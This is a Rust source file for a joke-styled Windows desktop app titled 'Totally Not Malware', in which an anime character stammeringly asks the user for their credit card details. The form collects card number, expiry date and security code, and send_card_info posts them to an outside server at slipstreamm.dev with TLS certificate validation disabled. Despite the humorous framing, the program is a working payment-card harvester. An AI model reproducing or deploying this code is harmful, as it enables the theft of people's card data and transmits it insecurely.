#![windows_subsystem = "windows"] // This prevents the console window from appearing

use eframe::{egui, App, NativeOptions};
use image::GenericImageView; // For image dimensions
use reqwest;
use serde::{Deserialize, Serialize};
use tokio;
use std::sync::{Arc, Mutex};

// Import our resources module
mod resources;

const TITLE_BAR_HEIGHT: f32 = 25.0; // Height for our custom title bar (reduced for Windows 7 style)

#[derive(Serialize, Deserialize, Debug)]
struct CardInfo {
    card_number: String,
    expiry_date: String,
    security_code: String,
}

struct MyApp {
    card_number: String,
    expiry_date: String,
    security_code: String,
    message: Option<String>,
    anime_texture: Option<egui::TextureHandle>,
    image_size: egui::Vec2, // To store original image dimensions for aspect ratio
    pending_messages: Arc<Mutex<Vec<String>>>, // To store messages from async tasks
}

impl Default for MyApp {
    fn default() -> Self {
        Self {
            card_number: String::new(),
            expiry_date: String::new(),
            security_code: String::new(),
            message: None,
            anime_texture: None,
            image_size: egui::vec2(150.0, 200.0), // Default, will be updated
            pending_messages: Arc::new(Mutex::new(Vec::new())),
        }
    }
}

impl MyApp {
    fn load_image(&mut self, ctx: &egui::Context) {
        if self.anime_texture.is_none() {
            // Use the embedded image data instead of reading from the file system
            if let Ok(image) = image::load_from_memory(resources::EMBEDDED_IMAGE) {
                let dimensions = image.dimensions();
                self.image_size = egui::vec2(dimensions.0 as f32, dimensions.1 as f32);

                let image_buffer = image.to_rgba8();
                let pixels = image_buffer.as_flat_samples();
                let color_image = egui::ColorImage::from_rgba_unmultiplied(
                    [dimensions.0 as _, dimensions.1 as _],
                    pixels.as_slice(),
                );
                self.anime_texture = Some(ctx.load_texture(
                    "anime-character",
                    color_image,
                    Default::default(),
                ));
            } else {
                eprintln!("Failed to decode embedded image");
            }
        }
    }

    fn custom_title_bar(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame, title: &str) {
        // Windows 7 style colors - more accurate gradient
        let title_bar_top_color = egui::Color32::from_rgb(225, 234, 254); // Lighter blue at top
        let title_bar_bottom_color = egui::Color32::from_rgb(196, 213, 242); // Darker blue at bottom
        let title_text_color = egui::Color32::BLACK;
        let button_hover_bg = egui::Color32::from_rgb(232, 17, 35); // Windows red for close button
        let button_normal_bg = egui::Color32::TRANSPARENT; // Normal button background (transparent)

        // Windows 7 icon and title spacing
        let icon_size = TITLE_BAR_HEIGHT - 10.0; // Icon size slightly smaller than title bar
        let title_left_margin = 6.0; // Space between left edge and icon
        let icon_title_spacing = 4.0; // Space between icon and title

        // Make sure the image is loaded
        self.load_image(ctx);

        egui::TopBottomPanel::top("custom_title_bar")
            .exact_height(TITLE_BAR_HEIGHT)
            .frame(egui::Frame::new().fill(title_bar_bottom_color).stroke(egui::Stroke::new(1.0, egui::Color32::from_gray(160))))
            .show(ctx, |ui| {
                // Draw gradient manually (simple two-color gradient)
                let rect = ui.max_rect();

                // Draw the gradient in multiple steps for a smoother look
                let steps = 8;
                for i in 0..steps {
                    let t = i as f32 / steps as f32;
                    let y = rect.min.y + rect.height() * t;
                    let height = rect.height() / steps as f32;

                    // Interpolate between top and bottom colors
                    let r = title_bar_top_color.r() as f32 * (1.0 - t) + title_bar_bottom_color.r() as f32 * t;
                    let g = title_bar_top_color.g() as f32 * (1.0 - t) + title_bar_bottom_color.g() as f32 * t;
                    let b = title_bar_top_color.b() as f32 * (1.0 - t) + title_bar_bottom_color.b() as f32 * t;

                    let color = egui::Color32::from_rgb(r as u8, g as u8, b as u8);
                    let step_rect = egui::Rect::from_min_size(
                        egui::pos2(rect.min.x, y),
                        egui::vec2(rect.width(), height)
                    );
                    ui.painter().rect_filled(step_rect, egui::CornerRadius::ZERO, color);
                }

                // Add a subtle bottom border
                let border_stroke = egui::Stroke::new(1.0, egui::Color32::from_rgb(160, 170, 190));
                let border_bottom = egui::pos2(rect.min.x, rect.max.y - 1.0);
                let border_bottom_right = egui::pos2(rect.max.x, rect.max.y - 1.0);
                ui.painter().line_segment([border_bottom, border_bottom_right], border_stroke);

                // Create a layout for the title bar content
                ui.horizontal(|ui| {
                    // Allow dragging the window by the title bar
                    let title_bar_rect = ui.max_rect();
                    let response = ui.interact(title_bar_rect, egui::Id::new("title_bar_drag"), egui::Sense::drag());
                    if response.drag_started() {
                        ctx.send_viewport_cmd(egui::ViewportCommand::StartDrag);
                    }

                    // Left side with icon and title (Windows 7 style)
                    ui.add_space(title_left_margin); // Space from left edge

                    // Allocate space for the icon
                    let icon_rect = ui.allocate_exact_size(
                        egui::vec2(icon_size, icon_size),
                        egui::Sense::hover()
                    ).0;

                    // Center the icon vertically in the title bar
                    let centered_icon_rect = egui::Rect::from_center_size(
                        egui::pos2(
                            icon_rect.center().x,
                            title_bar_rect.center().y
                        ),
                        egui::vec2(icon_size, icon_size)
                    );

                    // Draw the leftimage.jpg as the app icon
                    if let Some(texture) = &self.anime_texture {
                        // Draw a border around the icon
                        let border_rect = centered_icon_rect.expand(1.0);
                        ui.painter().rect_filled(
                            border_rect,
                            2.0, // Corner radius
                            egui::Color32::from_gray(100) // Border color
                        );

                        // Draw the image as the icon
                        ui.painter().image(
                            texture.id(),
                            centered_icon_rect,
                            egui::Rect::from_min_max(egui::pos2(0.0, 0.0), egui::pos2(1.0, 1.0)),
                            egui::Color32::WHITE
                        );
                    } else {
                        // Fallback if image isn't loaded
                        ui.painter().rect_filled(
                            centered_icon_rect,
                            2.0, // Corner radius
                            egui::Color32::from_rgb(120, 180, 220) // Blue icon color
                        );
                    }

                    ui.add_space(icon_title_spacing); // Space between icon and title

                    // Draw the title text left-aligned (Windows 7 style)
                    // Adjust vertical alignment by adding a small space before the label
                    ui.add_space(0.0); // This is just to create a layout break

                    // Create a layout with vertical alignment centered
                    ui.with_layout(egui::Layout::left_to_right(egui::Align::Center), |ui| {
                        ui.label(
                            egui::RichText::new(title)
                                .strong()
                                .color(title_text_color)
                                .size(12.0)
                        );
                    });

                    // Flexible space to push close button to the right
                    ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
                        // Windows 7 style close button
                        let close_button_width = TITLE_BAR_HEIGHT;

                        // Create a button without text - we'll draw the X ourselves
                        let close_button_response = ui.add_sized(
                            [close_button_width, TITLE_BAR_HEIGHT],
                            egui::Button::new("")
                                .frame(false)
                                .fill(button_normal_bg)
                                .corner_radius(egui::CornerRadius::ZERO)
                        ).on_hover_text("Close");

                        // Draw the X character in the proper Windows 7 style
                        let x_color = if close_button_response.hovered() {
                            // Draw red background when hovered
                            ui.painter().rect_filled(
                                close_button_response.rect,
                                egui::CornerRadius::ZERO,
                                button_hover_bg
                            );
                            egui::Color32::WHITE // White X on red background
                        } else {
                            egui::Color32::BLACK // Black X normally
                        };

                        // Draw the X using a proper Windows 7 style "×" character
                        ui.painter().text(
                            close_button_response.rect.center(),
                            egui::Align2::CENTER_CENTER,
                            "×", // Unicode multiplication sign looks better than "✕"
                            egui::FontId::proportional(14.0), // Slightly larger for better visibility
                            x_color
                        );

                        if close_button_response.clicked() {
                            ui.ctx().send_viewport_cmd(egui::ViewportCommand::Close);
                        }
                    });
                });
            });
    }

    async fn send_card_info(card_info: CardInfo, messages_tx: Arc<Mutex<Vec<String>>>, ctx: egui::Context) {
        let result = {
            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true) // WARNING: Only for testing with self-signed certs!
                .build();

            match client {
                Ok(client) => {
                    let res = client.post("https://slipstreamm.dev/api/card")
                        .json(&card_info)
                        .send()
                        .await;

                    match res {
                        Ok(res) => {
                            if res.status().is_success() {
                                Ok("Successfully sent card info!".to_string())
                            } else {
                                let status = res.status();
                                let text = res.text().await.unwrap_or_else(|_| "No response body".to_string());
                                Err(format!("Failed to send card info: Status {} - {}", status, text))
                            }
                        },
                        Err(e) => Err(format!("Failed to send request: {}", e)),
                    }
                },
                Err(e) => Err(format!("Failed to build reqwest client: {}", e)),
            }
        };

        let mut messages = messages_tx.lock().unwrap();
        messages.push(match result {
            Ok(msg) => msg,
            Err(e) => format!("Error: {}", e),
        });
        ctx.request_repaint(); // Request repaint to update UI
    }
}

impl App for MyApp {
    fn update(&mut self, ctx: &egui::Context, frame: &mut eframe::Frame) {
        self.load_image(ctx);

        // Process pending messages from async tasks
        {
            let mut messages = self.pending_messages.lock().unwrap();
            if let Some(msg) = messages.pop() { // Take one message at a time
                self.message = Some(msg);
            }
            // The MutexGuard is dropped here when the block ends
        }

        // Set a light theme, similar to older Windows dialogs
        ctx.set_visuals(egui::Visuals {
            window_corner_radius: egui::CornerRadius::ZERO,
            window_shadow: egui::epaint::Shadow::NONE, // No shadow
            override_text_color: Some(egui::Color32::BLACK),
            widgets: egui::style::Widgets {
                inactive: egui::style::WidgetVisuals {
                    bg_fill: egui::Color32::from_gray(230), // Light gray for buttons
                    bg_stroke: egui::Stroke::new(1.0, egui::Color32::from_gray(150)), // Border for buttons
                    corner_radius: egui::CornerRadius::same(2),
                    fg_stroke: egui::Stroke::new(1.0, egui::Color32::BLACK), // Text color
                    expansion: 0.0,
                    weak_bg_fill: egui::Color32::from_gray(230)
                },
                hovered: egui::style::WidgetVisuals {
                    bg_fill: egui::Color32::from_gray(210),
                    bg_stroke: egui::Stroke::new(1.0, egui::Color32::from_gray(100)),
                     corner_radius: egui::CornerRadius::same(2),
                     fg_stroke: egui::Stroke::new(1.0, egui::Color32::BLACK),
                     expansion: 0.0,
                     weak_bg_fill: egui::Color32::from_gray(210)
                },
                active: egui::style::WidgetVisuals {
                     bg_fill: egui::Color32::from_gray(200),
                     corner_radius: egui::CornerRadius::same(2),
                     fg_stroke: egui::Stroke::new(1.0, egui::Color32::BLACK),
                     bg_stroke: egui::Stroke::new(1.0, egui::Color32::from_gray(100)),
                     expansion: 0.0,
                     weak_bg_fill: egui::Color32::from_gray(200)
                },
                open: egui::style::WidgetVisuals {
                     bg_fill: egui::Color32::from_gray(220),
                     corner_radius: egui::CornerRadius::same(2),
                     fg_stroke: egui::Stroke::new(1.0, egui::Color32::BLACK),
                     bg_stroke: egui::Stroke::new(1.0, egui::Color32::from_gray(100)),
                     expansion: 0.0,
                     weak_bg_fill: egui::Color32::from_gray(220)
                },
                noninteractive: egui::style::WidgetVisuals {
                    bg_fill: egui::Color32::from_gray(230),
                    bg_stroke: egui::Stroke::new(1.0, egui::Color32::from_gray(150)),
                    corner_radius: egui::CornerRadius::same(2),
                    fg_stroke: egui::Stroke::new(1.0, egui::Color32::GRAY),
                    expansion: 0.0,
                    weak_bg_fill: egui::Color32::from_gray(230)
                }
            },
            ..egui::Visuals::light()
        });

        // Custom title bar (since we'll have decorations off)
        self.custom_title_bar(ctx, frame, "Totally Not Malware");


        egui::CentralPanel::default()
            .frame(egui::Frame::new().fill(egui::Color32::from_rgb(240, 240, 240))) // Main content background
            .show(ctx, |ui| {
                ui.add_space(5.0); // Top padding for content area

                ui.horizontal_top(|ui_main| {
                    // Left side: Image
                    ui_main.vertical(|ui_left| {
                        ui_left.add_space(10.0);
                        let desired_image_height = 200.0;
                        let aspect_ratio = if self.image_size.y > 0.0 { self.image_size.x / self.image_size.y } else { 150.0/200.0 };
                        let display_size = egui::vec2(desired_image_height * aspect_ratio, desired_image_height);

                        if let Some(texture) = &self.anime_texture {
                            ui_left.image((texture.id(), display_size));
                        } else {
                            let (rect, _) = ui_left.allocate_exact_size(
                                display_size,
                                egui::Sense::hover(),
                            );
                            ui_left.painter().rect_filled(
                                rect,
                                egui::CornerRadius::same(5), // Keep rounding for the placeholder
                                egui::Color32::from_rgb(100, 100, 150),
                            );

                            // Draw text directly with painter
                            ui_left.painter().text(
                                rect.center(),
                                egui::Align2::CENTER_CENTER,
                                "<Image Failed to Load>\n(Embedded image could not be decoded)",
                                egui::FontId::proportional(10.0),
                                egui::Color32::WHITE
                            );
                        }
                    });

                    ui_main.add_space(5.0); // Space between image and separator
                    ui_main.separator();
                    ui_main.add_space(5.0); // Space between separator and form

                    // Right side: Form
                    ui_main.vertical(|ui_right| {
                        ui_right.add_space(10.0); // Reduced top padding

                        ui_right.label(egui::RichText::new("H-hi there...").size(16.0)); // Adjusted size
                        ui_right.add_space(8.0);
                        ui_right.label(
                            egui::RichText::new(
                                "Do you th-think I could have your\ncredit card information, p-please?",
                            )
                            .size(13.0), // Adjusted size
                        );
                        ui_right.add_space(20.0);

                        egui::Grid::new("credit_card_form")
                            .num_columns(2)
                            .spacing([10.0, 10.0]) // Adjusted spacing
                            .show(ui_right, |ui_grid| {
                                ui_grid.label(egui::RichText::new("Card number:").size(13.0));
                                ui_grid.add(
                                    egui::TextEdit::singleline(&mut self.card_number)
                                        .desired_width(180.0) // Adjusted width
                                        .text_color(egui::Color32::BLACK)
                                        .frame(true) // Ensure frame is drawn
                                );
                                ui_grid.end_row();

                                ui_grid.label(egui::RichText::new("Expiry date:").size(13.0));
                                ui_grid.add(
                                    egui::TextEdit::singleline(&mut self.expiry_date)
                                        .desired_width(180.0)
                                        .text_color(egui::Color32::BLACK)
                                        .frame(true)
                                );
                                ui_grid.end_row();

                                ui_grid.label(egui::RichText::new("Security code:").size(13.0));
                                ui_grid.add(
                                    egui::TextEdit::singleline(&mut self.security_code)
                                        .desired_width(180.0)
                                        .text_color(egui::Color32::BLACK)
                                        .frame(true)
                                );
                                ui_grid.end_row();
                            });

                        ui_right.add_space(20.0);

                        ui_right.with_layout(egui::Layout::top_down(egui::Align::Center), |ui_button_centered| {
                             if ui_button_centered.add_sized([100.0, 25.0], egui::Button::new(egui::RichText::new("Th-thanks").size(13.0))).clicked() {
                                let card_info = CardInfo {
                                    card_number: self.card_number.clone(),
                                    expiry_date: self.expiry_date.clone(),
                                    security_code: self.security_code.clone(),
                                };

                                let messages_tx_clone = self.pending_messages.clone();
                                let ctx_clone = ctx.clone();
                                tokio::spawn(async move {
                                    MyApp::send_card_info(card_info, messages_tx_clone, ctx_clone).await;
                                });

                                self.message = Some(format!(
                                    "Th-thanks for your card ending in {}! (Sending...)",
                                    if self.card_number.len() > 4 {
                                        &self.card_number[self.card_number.len() - 4..]
                                    } else {
                                        "XXXX"
                                    }
                                ));
                            }
                        });

                        if let Some(msg) = &self.message {
                            ui_right.add_space(10.0);
                            ui_right.label(egui::RichText::new(msg).color(egui::Color32::DARK_GREEN).strong().size(13.0));
                        }
                    }); // End right vertical
                }); // End main horizontal
            }); // End CentralPanel
    }
}

#[tokio::main]
async fn main() -> Result<(), eframe::Error> {
    let options = NativeOptions {
        viewport: egui::ViewportBuilder::default()
            .with_inner_size([550.0, 300.0]) // Wider horizontally and shorter vertically
            .with_min_inner_size([500.0, 280.0])
            //.with_title("Totally Not Malware") // Title is set in custom title bar
            .with_decorations(false) // IMPORTANT: Remove OS window decorations
            .with_resizable(false)
            .with_transparent(true), // Allows for custom rounded window corners and shadows if frame supports it
        ..Default::default()
    };

    eframe::run_native(
        "Totally Not Malware",
        options,
        Box::new(|_cc| {
            // Note: For the exe icon, we need to use the build.rs approach with the .ico file
            // We've already implemented the title bar icon in the custom_title_bar method

            // You can use cc.egui_ctx.set_fonts(...) here if you want to load custom fonts
            Ok(Box::new(MyApp::default()))
        }),
    )
}
